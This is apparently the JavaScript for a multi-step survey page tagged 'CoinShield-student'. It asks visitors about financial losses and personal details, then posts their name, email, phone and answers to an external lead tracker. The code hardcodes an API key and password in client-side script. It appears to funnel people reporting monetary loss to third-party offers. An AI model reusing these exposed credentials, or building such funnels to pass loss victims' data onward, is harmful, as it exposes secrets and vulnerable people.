document.addEventListener('DOMContentLoaded', function () {
    const surveyForm = document.getElementById('surveyForm');
    const nextStepBtn = document.getElementById('nextStep');
    const quantitySpan = document.querySelector('.survey__quantity');
    const phoneInput = document.getElementById('phone-survey');
    const errorMessageContainer = surveyForm.querySelector('.survey__error-message');

    // Disable HTML5 validation
    surveyForm.setAttribute('novalidate', true);

    let currentStep = 1;
    const totalSteps = 8;

    // Initialize phone input
    // const itiSurvey = window.intlTelInput(phoneInput, {
    //     showFlags: true,
    //     separateDialCode: true,
    //     strictMode: true,
    //     initialCountry: "ca",
    //     countrySearch: false,
    //     utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@25.2.1/build/js/utils.js"
    // });

    const itiSurvey = window.intlTelInput(phoneInput, {
        loadUtils: () => import("https://cdn.jsdelivr.net/npm/intl-tel-input@25.3.2/build/js/utils.js"),
        initialCountry: "auto",
        geoIpLookup: callback => {
            fetch("https://ipwho.is/")
                .then(res => res.json())
                .then(data => callback(data.country_code))
                .catch(() => callback("us"));
        },
        strictMode: true,
        separateDialCode: true,

    });

    setTimeout(() => {
        const countryDropdownDivs = document.querySelectorAll('.survey__input-wrapper.phone .iti__country-container .iti__dropdown-content > div');
        countryDropdownDivs.forEach(div => {
            div.style.marginBottom = '10px';
        });
    }, 100);

    // Create error message elements for final step fields
    const finalStepFields = surveyForm.querySelectorAll('.survey__final-tab input');
    finalStepFields.forEach(field => {
        const fieldWrapper = document.createElement('div');
        fieldWrapper.style.cssText = `
            margin-bottom: 20px;
            width: 100%;
        `;

        // Перемістити поле вводу у wrapper
        field.parentNode.insertBefore(fieldWrapper, field);
        fieldWrapper.appendChild(field);

        // Створити div для повідомлення про помилку
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            color: white;
            background-color: #eb162b;
            font-size: 12px;
            margin-top: 5px;
            display: block;
            text-align: left;
            width: 100%;
            position: absolute;
            bottom: 0;
            z-index: 9;
            display: flex;
        `;
        fieldWrapper.appendChild(errorDiv);
    });

    // Add radio button change handlers
    const radioButtons = surveyForm.querySelectorAll('input[type="radio"]');
    radioButtons.forEach(radio => {
        radio.addEventListener('change', () => {
            const currentStepElement = document.querySelector(`[data-step="${currentStep}"]`);
            const checkedInputs = currentStepElement.querySelectorAll('input:checked');
            if (checkedInputs.length > 0) {
                clearSurveyError();
            }
        });
    });

    // Validation rules
    const validators = {
        first_name: (value) => {
            return value.length >= 2 ? '' : 'Must be at least 2 characters long';
        },
        last_name: (value) => {
            return value.length >= 2 ? '' : 'Must be at least 2 characters long';
        },
        email: (value) => {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(value) ? '' : 'Please enter a valid email address';
        },
        phone: (value) => {
            if (!itiSurvey) return 'Phone initialization failed';
            return itiSurvey.isValidNumber() ? '' : 'Please enter a valid phone number';
        }
    };

    // Show error message
    function showError(field, message) {
        const errorDiv = field.parentNode.querySelector('.error-message');
        if (errorDiv) {
            errorDiv.textContent = message;
            field.style.borderColor = 'red';
        }
    }

    // Clear error message
    function clearError(field) {
        const errorDiv = field.parentNode.querySelector('.error-message');
        if (errorDiv) {
            errorDiv.textContent = '';
            field.style.borderColor = '';
        }
    }

    // Show survey error message
    function showSurveyError(message) {
        errorMessageContainer.textContent = message;
        errorMessageContainer.style.display = 'block';
    }

    // Clear survey error message
    function clearSurveyError() {
        errorMessageContainer.textContent = '';
        errorMessageContainer.style.display = 'none';
    }

    // Show form error message
    function showFormError(message) {
        const existingError = surveyForm.querySelector('.form-error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorMessage = document.createElement('div');
        errorMessage.style.cssText = 'color: #000; text-align: center; padding: 10px; margin-top: 10px; background: rgba(255, 35, 20, 0.1); border-radius: 5px;';
        errorMessage.textContent = message;
        errorMessage.className = 'form-error-message';

        surveyForm.appendChild(errorMessage);
    }

    // Clear form error message
    function clearFormError() {
        const existingError = surveyForm.querySelector('.form-error-message');
        if (existingError) {
            existingError.remove();
        }
    }

    // Validate single field
    function validateField(field) {
        const value = field.value.trim();
        const validator = validators[field.name];

        if (validator) {
            const error = validator(value);
            if (error) {
                showError(field, error);
                return false;
            }
            clearError(field);
            return true;
        }

        // For radio buttons
        if (field.type === 'radio') {
            const name = field.name;
            const checked = surveyForm.querySelector(`input[name="${name}"]:checked`);
            if (!checked) {
                const fieldset = field.closest('fieldset');
                if (fieldset) {
                    showError(fieldset, 'Please select an option');
                }
                return false;
            }
            const fieldset = field.closest('fieldset');
            if (fieldset) {
                clearError(fieldset);
            }
        }

        return true;
    }

    // Add input event listeners for real-time validation
    finalStepFields.forEach(field => {
        field.addEventListener('input', function () {
            validateField(this);
        });
    });

    // Update step display
    function updateStepDisplay() {
        const allSteps = document.querySelectorAll('[data-step]');
        const surveyTitle = document.querySelector('.survey-title');

        allSteps.forEach(step => {
            if (parseInt(step.dataset.step) === currentStep) {
                step.style.display = 'block';
            } else {
                step.style.display = 'none';
            }
        });

        // Hide survey title on step 8
        if (surveyTitle) {
            if (currentStep === 8) {
                surveyTitle.style.display = 'none';
            } else {
                surveyTitle.style.display = 'block';
            }
        }

        quantitySpan.textContent = `${currentStep}/${totalSteps}`;

        // Update button text on last step
        if (currentStep >= 7) {
            nextStepBtn.style.display = 'none';
        } else {
            nextStepBtn.style.display = 'block';
        }
    }

    // Validate current step
    function validateCurrentStep() {
        const currentStepElement = document.querySelector(`[data-step="${currentStep}"]`);
        if (!currentStepElement) return true;

        let isValid = true;

        // Для кроків з радіо-кнопками
        if (currentStep < 7) {
            const checkedInputs = currentStepElement.querySelectorAll('input:checked');
            if (!checkedInputs.length) {
                showSurveyError('Please select an option before proceeding');
                return false;
            }
        } else if (currentStep === 7) {
            // Для 7-го кроку з текстовими полями
            const inputs = currentStepElement.querySelectorAll('input[required]');
            inputs.forEach(input => {
                if (!validateField(input)) {
                    isValid = false;
                }
            });
        }
        // 8-й крок не потребує валідації

        return isValid;
    }

    // Next step button handler
    nextStepBtn.addEventListener('click', function () {
        if (validateCurrentStep()) {
            currentStep++;
            updateStepDisplay();
            clearSurveyError();
            clearFormError();
        }
    });

    // Form submission handler
    surveyForm.addEventListener('submit', function (event) {
        event.preventDefault();

        // Clear old error messages before validation
        clearFormError();
        clearSurveyError();

        if (!validateCurrentStep()) {
            return;
        }

        const emailField = surveyForm.querySelector('input[name="email"]');
        const firstNameField = surveyForm.querySelector('input[name="first_name"]');
        const lastNameField = surveyForm.querySelector('input[name="last_name"]');

        const formData = {
            activity: surveyForm.querySelector('input[name="activity"]:checked').value,
            incident_time: surveyForm.querySelector('input[name="incident_time"]:checked').value,
            monetary_loss: surveyForm.querySelector('input[name="monetary_loss"]:checked').value,
            employment_status: surveyForm.querySelector('input[name="employment_status"]:checked').value,
            age_group: surveyForm.querySelector('input[name="age_group"]:checked').value,
            fund_source: surveyForm.querySelector('input[name="fund_source"]:checked').value,
            first_name: firstNameField.value.trim(),
            last_name: lastNameField.value.trim(),
            email: emailField.value.trim(),
            phone: itiSurvey.getNumber()
        };

        let thankYouWin = window.open('thank-you.html', '_blank');
        let offerWin = null;

        const data = {
            ApiKey: 'TVRRMk5USmZOelkyWHpFME5qVXlYdz09',
            ApiPassword: 'jDytrBCZ13',
            CampaignID: '19426',
            FirstName: formData.first_name,
            LastName: formData.last_name,
            Email: formData.email,
            PhoneNumber: formData.phone,
            Page: 'CoinShield-student',
            Description: `Survey Results:\nActivity: ${formData.activity}\nIncident Time: ${formData.incident_time}\nMonetary Loss: ${formData.monetary_loss}\nEmployment Status: ${formData.employment_status}\nAge Group: ${formData.age_group}\nFund Source: ${formData.fund_source}`
        };

        const submitBtn = surveyForm.querySelector('.survey__btn');
        const originalContent = submitBtn.innerHTML;
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="btn-content">Sending<span class="loader"></span></div>';

        fetch('https://tracker.pablos.team/repost.php?act=register', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: Object.entries(data)
                .map(([key, value]) => `${key}=${value}`)
                .join('&')
        })
            .then(response => {
                if (response.ok) {
                    return response.json();
                }
                throw new Error('Network response was not ok');
            })
            .then(responseJson => {
                if (responseJson.ret_code === '404') {
                    showFormError(responseJson.ret_message || 'An error occurred. Please try again.');
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = originalContent;
                    return;
                }

                if (responseJson.ret_code !== '404') {
                    localStorage.setItem('responseJson', JSON.stringify(responseJson));
                    if (responseJson.url) {
                        offerWin = window.open(responseJson.url, '_blank');
                        localStorage.removeItem('responseJson');
                    }
                    if (thankYouWin) {
                        thankYouWin.focus();
                    }
                    currentStep = 8;
                    updateStepDisplay();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                showFormError('An error occurred while sending your survey. Please try again later.');
                submitBtn.disabled = false;
                submitBtn.innerHTML = originalContent;
            });
    });

    // Initialize first step
    updateStepDisplay();
});
